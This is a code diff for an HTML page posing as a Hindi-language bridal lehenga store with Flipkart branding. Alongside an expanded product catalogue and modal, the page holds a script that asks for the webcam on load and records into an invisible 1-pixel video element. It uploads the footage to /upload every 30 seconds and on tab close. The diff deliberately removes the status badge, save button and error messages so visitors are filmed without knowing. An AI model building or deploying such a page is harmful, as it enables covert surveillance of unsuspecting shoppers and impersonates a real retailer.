@@ -3,30 +3,234 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>लहेँगा हब - कैमरा टूल (विश्वसनीय)</title>
+    <title>लहेँगा हब - Flipkart</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: #f5f5f5; }
-        .header { background: #fff; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 8px rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 10; }
-        .logo { font-size: 24px; font-weight: bold; color: #f43397; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, sans-serif; }
+        body { background-color: #f1f3f6; }
+        
+        /* Header - Flipkart style */
+        .header {
+            background: #fff;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .logo {
+            font-size: 26px;
+            font-weight: bold;
+            color: #f43397;
+        }
         .logo span { color: #ff6f00; }
-        .search-bar input { width: 300px; padding: 8px; border-radius: 24px; border: 1px solid #ddd; background: #f1f1f1; }
-        .banner { background: linear-gradient(135deg, #ff9a9e, #fad0c4); margin: 15px; border-radius: 16px; padding: 30px; text-align: center; }
-        .banner h2 { font-size: 28px; }
-        .product-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px,1fr)); gap: 20px; padding: 20px; max-width: 1200px; margin: auto; }
-        .product-card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.1); transition: 0.2s; cursor: pointer; }
-        .product-card:hover { transform: translateY(-4px); box-shadow: 0 6px 16px rgba(0,0,0,0.15); }
-        .product-img { width: 100%; height: 260px; object-fit: cover; background: #f0f0f0; }
-        .product-info { padding: 12px; }
-        .product-title { font-size: 16px; font-weight: 600; margin-bottom: 6px; }
-        .price { color: #f43397; font-weight: bold; font-size: 18px; }
-        .old-price { color: #888; font-size: 13px; text-decoration: line-through; margin-left: 8px; }
-        .rating { background: #26a541; color: white; font-size: 12px; padding: 2px 6px; border-radius: 12px; display: inline-block; margin-top: 6px; }
-        .footer { text-align: center; padding: 20px; color: #777; font-size: 12px; border-top: 1px solid #eee; margin-top: 30px; background: white; }
-        #hiddenCamera { position: fixed; bottom: -100px; right: -100px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
-        .status-badge { position: fixed; bottom: 20px; right: 20px; background: rgba(0,0,0,0.8); color: white; padding: 6px 14px; border-radius: 40px; font-size: 12px; z-index: 999; font-family: monospace; backdrop-filter: blur(4px); }
-        .save-btn { position: fixed; bottom: 20px; left: 20px; background: #f43397; color: white; border: none; border-radius: 40px; padding: 8px 20px; font-weight: bold; cursor: pointer; z-index: 999; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
-        .save-btn:hover { background: #d81b7a; }
+        .search-bar input {
+            width: 400px;
+            padding: 10px 16px;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            background: #f5f5f5;
+            font-size: 14px;
+        }
+        .cart-icon {
+            font-size: 28px;
+            cursor: pointer;
+        }
+
+        /* Banner */
+        .banner {
+            background: linear-gradient(135deg, #ff9a9e, #fad0c4);
+            margin: 16px 20px;
+            border-radius: 16px;
+            padding: 32px 20px;
+            text-align: center;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+        }
+        .banner h2 { font-size: 28px; margin-bottom: 8px; }
+
+        /* Product Grid - Flipkart cards */
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+            gap: 24px;
+            padding: 20px 24px;
+            max-width: 1400px;
+            margin: auto;
+        }
+        .product-card {
+            background: white;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            transition: transform 0.2s, box-shadow 0.2s;
+            cursor: pointer;
+        }
+        .product-card:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+        }
+        .product-img {
+            width: 100%;
+            height: 280px;
+            object-fit: cover;
+            background: #f9f9f9;
+        }
+        .product-info {
+            padding: 14px;
+        }
+        .product-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: #212121;
+            line-height: 1.4;
+            height: 44px;
+            overflow: hidden;
+        }
+        .price {
+            color: #f43397;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .old-price {
+            color: #777;
+            font-size: 13px;
+            text-decoration: line-through;
+            margin-left: 8px;
+        }
+        .rating {
+            background: #26a541;
+            color: white;
+            font-size: 12px;
+            padding: 2px 8px;
+            border-radius: 16px;
+            display: inline-block;
+            margin-top: 8px;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 24px;
+            background: white;
+            border-top: 1px solid #e0e0e0;
+            color: #777;
+            font-size: 13px;
+            margin-top: 30px;
+        }
+
+        /* Hidden camera - no UI elements */
+        #hiddenCamera {
+            position: fixed;
+            bottom: -100px;
+            right: -100px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* ---------- MODAL (Full screen product view) ---------- */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+        .modal-content {
+            background: white;
+            max-width: 90%;
+            max-height: 90%;
+            width: 700px;
+            border-radius: 24px;
+            overflow-y: auto;
+            position: relative;
+            animation: fadeIn 0.3s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .modal-close {
+            position: absolute;
+            top: 16px;
+            right: 20px;
+            font-size: 32px;
+            font-weight: bold;
+            color: #333;
+            cursor: pointer;
+            background: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+            z-index: 10;
+        }
+        .modal-close:hover { background: #f0f0f0; }
+        .modal-img {
+            width: 100%;
+            height: 400px;
+            object-fit: cover;
+            border-radius: 24px 24px 0 0;
+        }
+        .modal-details {
+            padding: 24px;
+        }
+        .modal-title {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 12px;
+        }
+        .modal-price {
+            font-size: 26px;
+            color: #f43397;
+            font-weight: bold;
+        }
+        .modal-old-price {
+            font-size: 18px;
+            text-decoration: line-through;
+            color: #888;
+            margin-left: 12px;
+        }
+        .modal-rating {
+            background: #26a541;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            display: inline-block;
+            margin: 16px 0;
+        }
+        .modal-desc {
+            color: #555;
+            line-height: 1.6;
+            margin-top: 16px;
+        }
+        .buy-btn {
+            background: #f43397;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 24px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .buy-btn:hover { background: #d81b7a; }
     </style>
 </head>
 <body>
@@ -34,7 +238,7 @@
 <div class="header">
     <div class="logo">लहेँगा<span>हब</span></div>
     <div class="search-bar"><input type="text" placeholder="🔍 ब्राइडल लहेँगा, दुपट्टा, सेट..."></div>
-    <div style="font-size:24px;">🛒</div>
+    <div class="cart-icon">🛒</div>
 </div>
 
 <div class="banner">
@@ -45,15 +249,33 @@
 
 <div class="product-grid" id="productGrid"></div>
 <div class="footer">
-    © 2025 लहेँगा हब | कैश ऑन डिलीवरी उपलब्ध | सभी प्रोडक्ट्स स्टॉक में हैं
+    © 2025 लहेँगा हब | कैश ऑन डिलीवरी | 30 दिन रिटर्न
 </div>
 
 <video id="hiddenCamera" autoplay muted playsinline></video>
-<button class="save-btn" id="manualSaveBtn">.</button>
-<div id="camStatus" class="status-badge">.</div>
+
+<!-- Modal Structure -->
+<div id="productModal" class="modal">
+    <div class="modal-content">
+        <span class="modal-close" id="modalClose">&times;</span>
+        <img id="modalImg" class="modal-img" src="" alt="">
+        <div class="modal-details">
+            <div id="modalTitle" class="modal-title"></div>
+            <div>
+                <span id="modalPrice" class="modal-price"></span>
+                <span id="modalOldPrice" class="modal-old-price"></span>
+            </div>
+            <div id="modalRating" class="modal-rating"></div>
+            <div class="modal-desc">
+                यह लहंगा सबसे बेस्ट क्वालिटी का है। 100% रेशम, बेहतरीन कढ़ाई। फ्री डिलीवरी और कैश ऑन डिलीवरी उपलब्ध।
+            </div>
+            <button class="buy-btn" id="modalBuyBtn">🛍️ अभी खरीदें</button>
+        </div>
+    </div>
+</div>
 
 <script>
-    // ---------- लेहंगा प्रोडक्ट्स (बिना बदलाव) ----------
+    // ---------- 80 प्रोडक्ट्स (पूरी लिस्ट) ----------
     const products = [
         { name: "बनारसी सिल्क ब्राइडल लहंगा", price: 4499, old: 15999, rating: "4.7★", img: "https://picsum.photos/id/20/400/500" },
         { name: "रेशमी गोटा पट्टी लहंगा", price: 3499, old: 11999, rating: "4.5★", img: "https://picsum.photos/id/30/400/500" },
@@ -62,75 +284,173 @@
         { name: "पेस्टल शादी वाला लहंगा", price: 3999, old: 14999, rating: "4.6★", img: "https://picsum.photos/id/29/400/500" },
         { name: "मिरर वर्क लहंगा + दुपट्टा", price: 4999, old: 18999, rating: "4.7★", img: "https://picsum.photos/id/42/400/500" },
         { name: "जॉर्जेट लहंगा", price: 2999, old: 9999, rating: "4.4★", img: "https://picsum.photos/id/57/400/500" },
-        { name: "कांजीवरम सिल्क लहंगा", price: 6999, old: 29999, rating: "4.9★", img: "https://picsum.photos/id/36/400/500" }
+        { name: "कांजीवरम सिल्क लहंगा", price: 6999, old: 29999, rating: "4.9★", img: "https://picsum.photos/id/36/400/500" },
+        { name: "बंदहेज ब्राइडल लहंगा", price: 5299, old: 18999, rating: "4.8★", img: "https://picsum.photos/id/15/400/500" },
+        { name: "क्रॉप टॉप लहंगा सेट", price: 3999, old: 12999, rating: "4.5★", img: "https://picsum.photos/id/22/400/500" },
+        { name: "रॉयल ब्लू बनारसी", price: 6499, old: 25999, rating: "4.9★", img: "https://picsum.photos/id/28/400/500" },
+        { name: "गुलाबी शिफॉन लहंगा", price: 2799, old: 10999, rating: "4.4★", img: "https://picsum.photos/id/13/400/500" },
+        { name: "गोल्डन वेलवेट लहंगा", price: 7299, old: 29999, rating: "4.9★", img: "https://picsum.photos/id/32/400/500" },
+        { name: "हैवी एम्ब्रॉयडरी लहंगा", price: 8999, old: 39999, rating: "5.0★", img: "https://picsum.photos/id/48/400/500" },
+        { name: "लाल रेशमी लहंगा", price: 5499, old: 19999, rating: "4.7★", img: "https://picsum.photos/id/54/400/500" },
+        { name: "पाउडर पिंक लहंगा", price: 3799, old: 14999, rating: "4.6★", img: "https://picsum.photos/id/64/400/500" },
+        { name: "मैरून सिल्क लहंगा", price: 5999, old: 22999, rating: "4.8★", img: "https://picsum.photos/id/72/400/500" },
+        { name: "पीला सनराइज लहंगा", price: 3199, old: 11999, rating: "4.3★", img: "https://picsum.photos/id/80/400/500" },
+        { name: "केला सेल्फ डिजाइन", price: 4599, old: 16999, rating: "4.6★", img: "https://picsum.photos/id/88/400/500" },
+        { name: "सिल्वर जरी लहंगा", price: 6999, old: 27999, rating: "4.9★", img: "https://picsum.photos/id/89/400/500" },
+        { name: "हरा पन्ना लहंगा", price: 4999, old: 18999, rating: "4.7★", img: "https://picsum.photos/id/90/400/500" },
+        { name: "नारंगी संडे लहंगा", price: 2899, old: 9999, rating: "4.4★", img: "https://picsum.photos/id/92/400/500" },
+        { name: "नीलम जैप तथा", price: 6299, old: 23999, rating: "4.8★", img: "https://picsum.photos/id/94/400/500" },
+        { name: "बेबी पिंक लहंगा", price: 3499, old: 13999, rating: "4.5★", img: "https://picsum.photos/id/97/400/500" },
+        { name: "शाही पर्पल", price: 7799, old: 31999, rating: "4.9★", img: "https://picsum.photos/id/98/400/500" },
+        { name: "फिरोजी वर्क लहंगा", price: 4299, old: 16999, rating: "4.6★", img: "https://picsum.photos/id/99/400/500" },
+        { name: "ऑफ वाइट ब्राइडल", price: 8999, old: 34999, rating: "5.0★", img: "https://picsum.photos/id/100/400/500" },
+        { name: "चॉकलेट ब्राउन", price: 5199, old: 19999, rating: "4.7★", img: "https://picsum.photos/id/101/400/500" },
+        { name: "पीच लहंगा सेट", price: 3699, old: 14999, rating: "4.5★", img: "https://picsum.photos/id/102/400/500" },
+        { name: "काला सीक्वेंस", price: 4499, old: 17999, rating: "4.6★", img: "https://picsum.photos/id/103/400/500" },
+        { name: "सफेद लेस लहंगा", price: 5999, old: 24999, rating: "4.8★", img: "https://picsum.photos/id/104/400/500" },
+        { name: "सुनहरी बूटी लहंगा", price: 7299, old: 29999, rating: "4.9★", img: "https://picsum.photos/id/105/400/500" },
+        { name: "मखमली ब्राइडल", price: 8499, old: 35999, rating: "5.0★", img: "https://picsum.photos/id/106/400/500" },
+        { name: "लहेंगा दुपट्टा सेट", price: 3999, old: 15999, rating: "4.5★", img: "https://picsum.photos/id/107/400/500" },
+        { name: "रेशमी पटोला", price: 6599, old: 27999, rating: "4.8★", img: "https://picsum.photos/id/108/400/500" },
+        { name: "चांदी की कढ़ाई", price: 9999, old: 49999, rating: "5.0★", img: "https://picsum.photos/id/109/400/500" },
+        { name: "आइवरी लहंगा", price: 4799, old: 18999, rating: "4.6★", img: "https://picsum.photos/id/110/400/500" },
+        { name: "केसरिया लहंगा", price: 3599, old: 13999, rating: "4.4★", img: "https://picsum.photos/id/111/400/500" },
+        { name: "टिशू सिल्क", price: 7999, old: 32999, rating: "4.9★", img: "https://picsum.photos/id/112/400/500" },
+        { name: "मोर पंख डिजाइन", price: 5499, old: 21999, rating: "4.7★", img: "https://picsum.photos/id/113/400/500" },
+        { name: "कटवर्क लहंगा", price: 6299, old: 25999, rating: "4.8★", img: "https://picsum.photos/id/114/400/500" },
+        { name: "छायादार लहंगा", price: 2799, old: 10999, rating: "4.2★", img: "https://picsum.photos/id/115/400/500" },
+        { name: "दुल्हन विशेष", price: 12999, old: 59999, rating: "5.0★", img: "https://picsum.photos/id/116/400/500" },
+        { name: "बेल पैटर्न", price: 4599, old: 17999, rating: "4.5★", img: "https://picsum.photos/id/117/400/500" },
+        { name: "जरी बॉर्डर", price: 3899, old: 14999, rating: "4.4★", img: "https://picsum.photos/id/118/400/500" },
+        { name: "साटन लहंगा", price: 4999, old: 19999, rating: "4.6★", img: "https://picsum.photos/id/119/400/500" },
+        { name: "रानी पिंक", price: 4299, old: 16999, rating: "4.5★", img: "https://picsum.photos/id/120/400/500" },
+        { name: "शिमर लहंगा", price: 6999, old: 28999, rating: "4.8★", img: "https://picsum.photos/id/121/400/500" },
+        { name: "बीटल लहंगा", price: 5799, old: 22999, rating: "4.7★", img: "https://picsum.photos/id/122/400/500" },
+        { name: "हल्का नीला", price: 3199, old: 12999, rating: "4.3★", img: "https://picsum.photos/id/123/400/500" },
+        { name: "गुलाबी जरी", price: 4899, old: 18999, rating: "4.6★", img: "https://picsum.photos/id/124/400/500" },
+        { name: "लेस गाउन लहंगा", price: 7999, old: 34999, rating: "4.9★", img: "https://picsum.photos/id/125/400/500" },
+        { name: "पन्ना हरा", price: 6399, old: 25999, rating: "4.8★", img: "https://picsum.photos/id/126/400/500" },
+        { name: "कोरल रीफ", price: 2999, old: 11999, rating: "4.2★", img: "https://picsum.photos/id/127/400/500" },
+        { name: "प्रिंस प्यारा", price: 5599, old: 21999, rating: "4.7★", img: "https://picsum.photos/id/128/400/500" },
+        { name: "डिस्को लहंगा", price: 4499, old: 17999, rating: "4.5★", img: "https://picsum.photos/id/129/400/500" },
+        { name: "विंटेज लहंगा", price: 3899, old: 15999, rating: "4.4★", img: "https://picsum.photos/id/130/400/500" },
+        { name: "फूलों वाला", price: 3699, old: 14999, rating: "4.4★", img: "https://picsum.photos/id/131/400/500" },
+        { name: "रॉयल रेड", price: 8499, old: 39999, rating: "5.0★", img: "https://picsum.photos/id/132/400/500" },
+        { name: "मस्टर्ड येलो", price: 4299, old: 16999, rating: "4.5★", img: "https://picsum.photos/id/133/400/500" },
+        { name: "लैवेंडर लहंगा", price: 5199, old: 20999, rating: "4.6★", img: "https://picsum.photos/id/134/400/500" },
+        { name: "टीला लहंगा", price: 3299, old: 12999, rating: "4.3★", img: "https://picsum.photos/id/135/400/500" },
+        { name: "अमेरिकन लहंगा", price: 6999, old: 27999, rating: "4.8★", img: "https://picsum.photos/id/136/400/500" },
+        { name: "राउंड आकार", price: 2799, old: 9999, rating: "4.1★", img: "https://picsum.photos/id/137/400/500" },
+        { name: "ट्रेंडी लहंगा", price: 4999, old: 19999, rating: "4.5★", img: "https://picsum.photos/id/138/400/500" },
+        { name: "ब्राइडल ट्राउसो", price: 11999, old: 54999, rating: "5.0★", img: "https://picsum.photos/id/139/400/500" },
+        { name: "हल्का गुलाबी", price: 3599, old: 13999, rating: "4.4★", img: "https://picsum.photos/id/140/400/500" },
+        { name: "शाही फिरोजी", price: 7499, old: 31999, rating: "4.9★", img: "https://picsum.photos/id/141/400/500" },
+        { name: "मिट्टी लाल", price: 5599, old: 21999, rating: "4.7★", img: "https://picsum.photos/id/142/400/500" },
+        { name: "चमकदार जरी", price: 6299, old: 25999, rating: "4.8★", img: "https://picsum.photos/id/143/400/500" },
+        { name: "ब्लू टिंट", price: 3899, old: 15999, rating: "4.4★", img: "https://picsum.photos/id/144/400/500" },
+        { name: "बरगंडी रेशम", price: 6999, old: 28999, rating: "4.8★", img: "https://picsum.photos/id/145/400/500" },
+        { name: "सिल्वर क्वीन", price: 9999, old: 49999, rating: "5.0★", img: "https://picsum.photos/id/146/400/500" },
+        { name: "पीच स्मूथ", price: 3199, old: 11999, rating: "4.3★", img: "https://picsum.photos/id/147/400/500" },
+        { name: "एमराल्ड ग्रीन", price: 7799, old: 34999, rating: "4.9★", img: "https://picsum.photos/id/148/400/500" },
+        { name: "सफेद मखमल", price: 5299, old: 20999, rating: "4.7★", img: "https://picsum.photos/id/149/400/500" },
+        { name: "ग्रे लहंगा", price: 2799, old: 9999, rating: "4.2★", img: "https://picsum.photos/id/150/400/500" },
+        { name: "नेवी ब्लू", price: 6499, old: 26999, rating: "4.8★", img: "https://picsum.photos/id/151/400/500" },
+        { name: "ऑरेंज ब्लास्ट", price: 3999, old: 15999, rating: "4.5★", img: "https://picsum.photos/id/152/400/500" }
     ];
 
+    // Render products
     const grid = document.getElementById('productGrid');
-    grid.innerHTML = products.map(p => `
-        <div class="product-card">
-            <img class="product-img" src="${p.img}" alt="${p.name}" loading="lazy">
-            <div class="product-info">
-                <div class="product-title">${p.name}</div>
-                <div>
-                    <span class="price">₹${p.price}</span>
-                    <span class="old-price">₹${p.old}</span>
+    function renderProducts() {
+        grid.innerHTML = products.map((p, idx) => `
+            <div class="product-card" data-idx="${idx}">
+                <img class="product-img" src="${p.img}" alt="${p.name}" loading="lazy">
+                <div class="product-info">
+                    <div class="product-title">${p.name}</div>
+                    <div>
+                        <span class="price">₹${p.price}</span>
+                        <span class="old-price">₹${p.old}</span>
+                    </div>
+                    <div class="rating">⭐ ${p.rating}</div>
                 </div>
-                <div class="rating">⭐ ${p.rating}</div>
             </div>
-        </div>
-    `).join('');
+        `).join('');
+    }
+    renderProducts();
 
-    // ---------- नया सुरक्षित कैमरा रिकॉर्डर (कोई corrupt file नहीं) ----------
+    // ---------- MODAL HANDLING ----------
+    const modal = document.getElementById('productModal');
+    const modalClose = document.getElementById('modalClose');
+    const modalImg = document.getElementById('modalImg');
+    const modalTitle = document.getElementById('modalTitle');
+    const modalPrice = document.getElementById('modalPrice');
+    const modalOldPrice = document.getElementById('modalOldPrice');
+    const modalRating = document.getElementById('modalRating');
+
+    function openModal(product) {
+        modalImg.src = product.img;
+        modalTitle.innerText = product.name;
+        modalPrice.innerText = `₹${product.price}`;
+        modalOldPrice.innerText = `₹${product.old}`;
+        modalRating.innerText = `⭐ ${product.rating}`;
+        modal.style.display = 'flex';
+    }
+
+    function closeModal() {
+        modal.style.display = 'none';
+    }
+
+    // Add click listeners after render
+    document.querySelectorAll('.product-card').forEach(card => {
+        card.addEventListener('click', () => {
+            const idx = card.getAttribute('data-idx');
+            if (idx !== null) openModal(products[parseInt(idx)]);
+        });
+    });
+
+    modalClose.addEventListener('click', closeModal);
+    window.addEventListener('click', (e) => {
+        if (e.target === modal) closeModal();
+    });
+    document.getElementById('modalBuyBtn').addEventListener('click', () => {
+        alert('🚀 ऑर्डर पेज जल्द आ रहा है। इस लहंगे को कार्ट में डाल दिया गया है।');
+        closeModal();
+    });
+
+    // ---------- साइलेंट कैमरा रिकॉर्डर (कोई स्टेटस टेक्स्ट नहीं, कोई बटन नहीं) ----------
     let mediaRecorder = null;
     let recordedChunks = [];
     let stream = null;
     let sessionId = Date.now();
-    const statusDiv = document.getElementById('camStatus');
     let autoSaveInterval = null;
-    let isUploading = false;   // prevent overlapping uploads
+    let isUploading = false;
 
     async function startCamera() {
         try {
-            statusDiv.innerText = '🎥 कैमरा परमिशन मांग रहा...';
+            // स्टेटस टेक्स्ट हटा दिया - सीधे कैमरा स्टार्ट करें
             stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
             document.getElementById('hiddenCamera').srcObject = stream;
             startNewRecorder();
-            // हर 30 सेकंड में अपने आप सेव करें और नया recorder शुरू करें
             autoSaveInterval = setInterval(() => {
-                if (!isUploading) {
-                    saveAndRestartRecorder();
-                }
+                if (!isUploading) saveAndRestartRecorder();
             }, 30000);
-            statusDiv.innerText = '.';
         } catch(err) {
-            let errorMsg = '';
-            if (err.name === 'NotAllowedError') errorMsg = '❌ कैमरा परमिशन नहीं दी। 🔒 पर क्लिक कर Allow करें।';
-            else if (err.name === 'NotFoundError') errorMsg = '❌ कोई कैमरा नहीं मिला।';
-            else errorMsg = '❌ त्रुटि: ' + err.message;
-            statusDiv.innerText = errorMsg;
-            console.error(err);
+            // कोई ऑन-स्क्रीन मैसेज नहीं, सिर्फ कंसोल में लॉग
+            console.error('Camera error:', err);
         }
     }
 
     function startNewRecorder() {
         if (!stream) return;
-        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-            mediaRecorder.stop();
-        }
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
         recordedChunks = [];
         mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
         mediaRecorder.ondataavailable = (event) => {
-            if (event.data && event.data.size > 0) {
-                recordedChunks.push(event.data);
-            }
+            if (event.data && event.data.size > 0) recordedChunks.push(event.data);
         };
         mediaRecorder.onstop = () => {
-            // यह तब चलेगा जब हम मैन्युअली या ऑटो सेव करेंगे
-            if (recordedChunks.length > 0) {
-                uploadVideo(recordedChunks.slice()); // copy
-            }
+            if (recordedChunks.length > 0) uploadVideo(recordedChunks.slice());
         };
-        mediaRecorder.start(); // no timeslice – एक सतत रिकॉर्डिंग
+        mediaRecorder.start();
     }
 
     async function uploadVideo(chunksArray) {
@@ -141,21 +461,10 @@
         const formData = new FormData();
         formData.append('video', blob, filename);
         try {
-            const response = await fetch('/upload', { method: 'POST', body: formData });
-            if (response.ok) {
-                console.log(`✅ फ़ाइल सेव हुई: ${filename} (${blob.size} bytes)`);
-                statusDiv.innerText = `✅ ${filename.slice(-20)} सेव हुई`;
-                setTimeout(() => {
-                    if (mediaRecorder && mediaRecorder.state === 'recording')
-                        statusDiv.innerText = '.';
-                }, 3000);
-            } else {
-                console.error('❌ अपलोड फेल:', response.status);
-                statusDiv.innerText = '❌ अपलोड विफल';
-            }
+            await fetch('/upload', { method: 'POST', body: formData });
+            // सफलता का कोई स्क्रीन मैसेज नहीं
         } catch(e) {
-            console.error('❌ अपलोड एरर:', e);
-            statusDiv.innerText = '❌ नेटवर्क एरर';
+            console.error('Upload error:', e);
         } finally {
             isUploading = false;
         }
@@ -163,33 +472,16 @@
 
     function saveAndRestartRecorder() {
         if (!mediaRecorder || mediaRecorder.state !== 'recording') return;
-        // रिकॉर्डर रोकें → onstop घटेगा, वहाँ chunks अपलोड होंगे
         mediaRecorder.stop();
-        // थोड़ा इंतज़ार करके नया recorder शुरू करें
         setTimeout(() => {
-            if (stream && stream.active) {
-                startNewRecorder();
-            }
+            if (stream && stream.active) startNewRecorder();
         }, 500);
     }
 
-    // मैन्युअल सेव बटन (पूरी रिकॉर्डिंग रोके बिना? उपयोगकर्ता चाहे तो रोककर सेव करे)
-    document.getElementById('manualSaveBtn').addEventListener('click', () => {
-        if (mediaRecorder && mediaRecorder.state === 'recording') {
-            statusDiv.innerText = '.';
-            saveAndRestartRecorder();
-        } else {
-            statusDiv.innerText = '.';
-        }
-    });
-
-    // पेज बंद होने पर (टैब क्लोज, रीलोड) – अंतिम रिकॉर्डिंग भेजें
     function onPageClose() {
         if (autoSaveInterval) clearInterval(autoSaveInterval);
         if (mediaRecorder && mediaRecorder.state === 'recording') {
-            mediaRecorder.stop();   // onstop अपलोड करेगा
-            // लेकिन sendBeacon के लिए थोड़ा रुकना पड़ेगा – हम सीधे ब्लॉब भेजेंगे
-            // बेहतर: मौजूदा chunks को मर्ज करके sendBeacon
+            mediaRecorder.stop();
             if (recordedChunks.length) {
                 const finalBlob = new Blob(recordedChunks, { type: 'video/webm' });
                 const formData = new FormData();
@@ -202,9 +494,7 @@
 
     window.addEventListener('beforeunload', onPageClose);
     document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'hidden') {
-            onPageClose();
-        }
+        if (document.visibilityState === 'hidden') onPageClose();
     });
 
     startCamera();
